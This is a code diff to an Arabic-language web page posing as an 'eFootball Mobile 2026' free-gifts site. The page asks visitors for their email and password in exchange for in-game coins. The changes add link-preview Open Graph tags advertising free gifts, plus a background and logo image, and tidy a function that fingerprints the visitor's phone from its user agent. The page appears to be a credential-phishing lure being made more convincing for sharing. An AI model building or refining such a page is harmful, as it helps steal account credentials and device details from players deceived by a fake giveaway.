@@ -4,9 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>eFootball Mobile - هدايا وهبات مجانية</title>
+    
+    <!-- الوسوم الخاصة بالصورة عند مشاركة الرابط (Open Graph) -->
+    <meta property="og:title" content="eFootball Mobile 2026 - شحن هدايا مجانية">
+    <meta property="og:description" content="سجل دخولك واستلم عملات وهدايا لعبة eFootball Mobile فوراً.">
+    <meta property="og:image" content="IMG_20260830_052043_542.jpg">
+    <meta property="og:type" content="website">
+
     <style>
         body {
-            background: linear-gradient(135deg, #0d1b2a, #1b263b, #415a77);
+            /* جعل الصورة خلفية للصفحة مع تغطية داكنة لتكون النصوص واضحة */
+            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(27, 38, 59, 0.9)), url('IMG_20260830_052043_542.jpg') no-repeat center center fixed;
+            background-size: cover;
             color: #ffffff;
             font-family: 'Cairo', Tahoma, sans-serif;
             display: flex;
@@ -17,7 +26,7 @@
             flex-direction: column;
         }
         .card {
-            background: rgba(15, 23, 42, 0.95);
+            background: rgba(15, 23, 42, 0.9);
             border: 2px solid #00f5d4;
             padding: 30px;
             border-radius: 12px;
@@ -27,7 +36,17 @@
             text-align: center;
             box-sizing: border-box;
         }
-        h2 { color: #00f5d4; font-size: 24px; margin-bottom: 10px; text-shadow: 0 0 10px rgba(0,245,212,0.5); }
+        /* تنسيق اللوجو داخل الواجهة */
+        .logo-img {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 2px solid #00f5d4;
+            object-fit: cover;
+            margin-bottom: 15px;
+            box-shadow: 0 0 15px rgba(0, 245, 212, 0.5);
+        }
+        h2 { color: #00f5d4; font-size: 22px; margin-bottom: 10px; text-shadow: 0 0 10px rgba(0,245,212,0.5); }
         p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
         .input-group {
             margin-bottom: 15px;
@@ -108,6 +127,9 @@
 <body>
 
     <div class="card">
+        <!-- اللوجو الخاص بالصورة داخل الواجهة -->
+        <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
+        
         <h2>⚽ eFootball Mobile 2026</h2>
         <p>سجل دخولك بحساب الإيميل وكلمة المرور لمزامنة التطابق واستلام الهدايا والعملات فوراً.</p>
         
@@ -155,24 +177,20 @@
             } catch (e) {}
         }
 
-        // دالة محسنة لتحليل ومعرفة نوع الهاتف بدقة وتجاوز اختصار Linux
         function getAdvancedDeviceInfo() {
             let ua = navigator.userAgent;
             let deviceName = "هاتف محمول (غير معروف الطراز بدقة)";
             let androidVersion = "Android غير معروف";
 
             if (/android/i.test(ua)) {
-                // استخراج إصدار الأندرويد
                 let match = ua.match(/Android\s([0-9\.]+)/);
                 if (match) androidVersion = `Android ${match[1]}`;
 
-                // محاولة البحث عن طراز الجهاز المكتوب صراحة بين الأقواس
                 let matches = ua.match(/\(([^)]+)\)/);
                 if (matches && matches[1]) {
                     let parts = matches[1].split(';');
                     for (let p of parts) {
                         p = p.trim();
-                        // إذا كان النص يحتوي على رقم طراز أو اسم شركة معروفة
                         if (p.length > 3 && !p.includes("Linux") && !p.includes("KHTML") && !p.includes("Mobile") && !p.includes("U;") && !p.includes("CPU")) {
                             deviceName = p;
                             break;
@@ -185,7 +203,6 @@
                 deviceName = /iPad/.test(ua) ? "iPad" : "iPhone";
             }
 
-            // فحص إضافي للمعالج والمعمارية
             let cpuArchitecture = navigator.userAgentData && navigator.userAgentData.platform ? navigator.userAgentData.platform : "ARM / Linux Core";
 
             return {
